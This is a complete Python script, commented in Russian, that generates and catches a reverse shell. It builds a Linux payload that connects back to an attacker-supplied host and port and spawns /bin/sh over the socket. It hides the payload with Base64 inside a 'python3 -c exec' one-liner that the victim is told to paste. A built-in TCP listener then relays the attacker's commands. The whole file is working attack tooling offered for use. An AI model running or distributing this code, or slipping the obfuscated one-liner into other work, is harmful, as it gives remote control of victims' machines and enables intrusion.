#!/usr/bin/env python3 

import socket 
import argparse 
import base64 

def generate_payload(lhost, lport): 
    """ 
    Генерирует Python-пэйлоад для жертвы. 
    """ 
    print(f"[*] Генерируем Reverse Shell Payload для {lhost}:{lport}...") 
     
    # 1. Оригинальный код шелла (Linux) 
    # Создаем сокет, подключаемся, дублируем файловые дескрипторы 0,1,2 в сокет, запускаем /bin/sh 
    raw_payload = f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')" 
     
    # 2. Обфускация (Base64 encoding) 
    # Кодируем строку в байты, затем в base64 
    b64_payload = base64.b64encode(raw_payload.encode()).decode() 
     
    # 3. Финальный однострочник, который жертва должна выполнить в консоли 
    final_payload = f"python3 -c \"import base64; exec(base64.b64decode('{b64_payload}').decode())\"" 
     
    print("\n[+] Скопируйте и выполните следующую команду на машине Жертвы:\n") 
    print("-" * 50) 
    print(final_payload) 
    print("-" * 50 + "\n") 

def start_listener(lport): 
    """ 
    Поднимает TCP-слушатель и ждет подключения жертвы. 
    """ 
    print(f"[*] Запуск Listener'а на порту {lport}...") 
     
    # Код Listener'а 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock: 
        # Устанавливаем опцию SO_REUSEADDR, чтобы порт не «зависал» после завершения скрипта 
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        server_sock.bind(("0.0.0.0", lport)) 
        server_sock.listen(1) 
         
        print(f"[*] Ожидание подключения...") 
        client_sock, addr = server_sock.accept() 
        print(f"[!!!] АЛЕРТ: Получено входящее Reverse Shell подключение от {addr[0]}:{addr[1]}") 
         
        # Интерактивный цикл (получение команд от Атакующего и отправка Жертве) 
        while True: 
            try: 
                # Читаем вывод от жертвы 
                response = client_sock.recv(4096).decode(errors='ignore') 
                print(response, end="") 
                 
                # Запрашиваем новую команду 
                command = input() + "\n" 
                 
                # Отправляем команду жертве 
                client_sock.send(command.encode()) 
                 
                if command.strip() == "exit": 
                    break 
                     
            except KeyboardInterrupt: 
                print("\n[*] Завершение сессии.") 
                break 
            except Exception as e: 
                print(f"\n[-] Ошибка: {e}") 
                break 

if __name__ == "__main__": 
    parser = argparse.ArgumentParser(description="Advanced Python Reverse Shell Generator & Listener") 
    parser.add_argument("-L", "--lhost", required=True, help="IP-адрес Атакующего (Listening IP)") 
    parser.add_argument("-P", "--lport", type=int, default=443, help="Порт Атакующего (Default: 443)") 
     
    args = parser.parse_args() 
     
    # Сначала генерируем Payload 
    generate_payload(args.lhost, args.lport) 
     
    # Затем поднимаем Listener 
    start_listener(args.lport)
